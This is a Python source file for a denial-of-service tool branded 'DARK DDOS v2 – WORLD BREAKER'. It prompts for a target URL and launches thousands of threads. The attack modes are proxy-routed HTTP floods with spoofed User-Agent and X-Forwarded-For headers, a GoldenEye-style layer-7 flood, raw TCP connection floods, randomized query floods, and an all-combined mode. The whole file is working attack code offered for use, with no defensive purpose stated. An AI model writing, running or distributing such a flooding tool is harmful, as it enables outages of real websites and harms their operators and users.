import os
import random
import socket
import threading
import time
import requests
from urllib.parse import urlparse
import shutil
import sys


NUM_THREADS = min(1000000, (os.cpu_count() or 4) * 10000)
BURST_REQUESTS = 10
ATTACK_DURATION = 20
PROXY_FILE = "proxies.txt"
FAKE_UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
]


def show_intro():
    print("\033[94m")
    print("╔════════════════════════════════════════════════════════════╗")
    print("║                    ⚡ SYSTEM PROFILE ⚡                ║")
    print("╠════════════════════════════════════════════════════════════╣")
    print("║ 👤 Name       : A M I T                           ║")
    print("║ 🌐 Team : DARK                          ║")
    print("║ 🅾 Instagram Id  : @dark_exploit_                           ║")
    print("║ 🧠 Speciality : System Breach | Proxy Manipulation         ║")
    print("╚════════════════════════════════════════════════════════════╝")
    print("\033[0m")
    time.sleep(2)


def show_banner():
    os.system("cls" if os.name == "nt" else "clear")
    show_intro()
    print("""\033[95m
╔══════════════════════════════════════════════════════════╗
║         ☠️ DARK DDOS v2 – WORLD BREAKER ☠️               ║
║  🔥 Coded by: AMIT| Proxy + full fast 🔥   ║
╠══════════════════════════════════════════════════════════╣
║  🚀 Max Threads   : {:>8}                               ║
║  ⏱️  Attack Time   : 20 seconds                            ║
║  📁 Proxies File  : proxies.txt                           ║
╚══════════════════════════════════════════════════════════╝\033[0m
""".format(NUM_THREADS))
    time.sleep(1)

#
def load_proxies():
    if not os.path.exists(PROXY_FILE):
        return None
    with open(PROXY_FILE) as f:
        lines = [line.strip() for line in f if line.strip()]
        return lines if lines else None


def resolve_target(target_url):
    try:
        domain = urlparse(target_url).netloc if "http" in target_url else target_url
        ip = socket.gethostbyname(domain)
        return domain, ip
    except:
        return target_url, None

def generate_headers(domain):
    return {
        "User-Agent": random.choice(FAKE_UA_LIST),
        "Referer": f"https://{domain}/?id={random.randint(100000,999999)}",
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    }


def http_flood(domain, url, proxies=None):
    def flood():
        end_time = time.time() + ATTACK_DURATION
        while time.time() < end_time:
            try:
                headers = generate_headers(domain)
                proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None
                for _ in range(BURST_REQUESTS):
                    requests.get(url, headers=headers, proxies=proxy, timeout=5)
                print(f"\033[92m[⚔️] HTTP Burst sent to {url}\033[0m")
            except:
                pass
    for _ in range(NUM_THREADS):
        threading.Thread(target=flood).start()

def goldeneye_flood(url, proxies=None):
    def golden():
        end_time = time.time() + ATTACK_DURATION
        while time.time() < end_time:
            try:
                headers = generate_headers(urlparse(url).netloc)
                proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None
                requests.get(url, headers=headers, proxies=proxy, timeout=3)
                print(f"\033[94m[🌀] GoldenEye packet sent to {url}\033[0m")
            except:
                pass
    for _ in range(NUM_THREADS):
        threading.Thread(target=golden).start()

def socket_flood(domain, ip):
    def raw_socket():
        end_time = time.time() + ATTACK_DURATION
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((ip, 80))
                s.send(f"GET / HTTP/1.1\r\nHost: {domain}\r\n\r\n".encode())
                s.close()
                print(f"\033[91m[🔌] Raw TCP packet sent to {ip}\033[0m")
            except:
                pass
    for _ in range(NUM_THREADS):
        threading.Thread(target=raw_socket).start()

def payload_randomizer_attack(domain, url):
    def randomized():
        end_time = time.time() + ATTACK_DURATION
        while time.time() < end_time:
            try:
                rand_url = url + f"?q={random.randint(1000,9999)}&t={random.random()}"
                headers = generate_headers(domain)
                requests.get(rand_url, headers=headers, timeout=3)
                print(f"\033[93m[🎲] Randomized payload sent to {rand_url}\033[0m")
            except:
                pass
    for _ in range(NUM_THREADS):
        threading.Thread(target=randomized).start()


def start_ui():
    show_banner()
    proxies = load_proxies()
    if proxies:
        print(f"\033[90m[📡] Loaded {len(proxies)} proxies from '{PROXY_FILE}'\033[0m")

    print("\033[96m")
    print("╔════════════════════════════════════════════╗")
    print("║        🔥 MAIN ATTACK MENU 🔥      ║")
    print("╠════════════════════════════════════════════╣")
    print("║ [1] Ultra HTTP Attack (Spoof + Proxy)      ║")
    print("║ [2] GoldenEye Layer 7 (Proxy Flood)       ║")
    print("║ [3] Raw TCP Socket Attack                 ║")
    print("║ [4] Random Payload Mutation               ║")
    print("║ [5] MASSIVE MODE (All combined)          ║")
    print("║ [6] Exit                                  ║")
    print("╚════════════════════════════════════════════╝")
    print("\033[0m")

    try:
        choice = input("🧠 Choose your Attack Mode (1-6): ").strip()
        if choice == "6":
            print("👋 Exiting...")
            return
        target = input("🎯 Enter Target URL: ").strip()
    except (EOFError, OSError):
        print("[⚠️] Input not supported in this environment. Exiting.")
        return

    domain, ip = resolve_target(target)
    if not ip:
        print("\033[91m[❌] Could not resolve IP.\033[0m")
        return

    print(f"\n\033[93m[✔️] Domain: {domain}")
    print(f"[🌐] IP Address: {ip}")
    print(f"[🚀] Launching {NUM_THREADS} threads for {ATTACK_DURATION}s...\033[0m\n")

    if choice == "1":
        http_flood(domain, target, proxies)
    elif choice == "2":
        goldeneye_flood(target, proxies)
    elif choice == "3":
        socket_flood(domain, ip)
    elif choice == "4":
        payload_randomizer_attack(domain, target)
    elif choice == "5":
        http_flood(domain, target, proxies)
        goldeneye_flood(target, proxies)
        socket_flood(domain, ip)
        payload_randomizer_attack(domain, target)
    else:
        print("\033[91m[❌] Invalid choice.\033[0m")


if __name__ == '__main__':
    start_ui()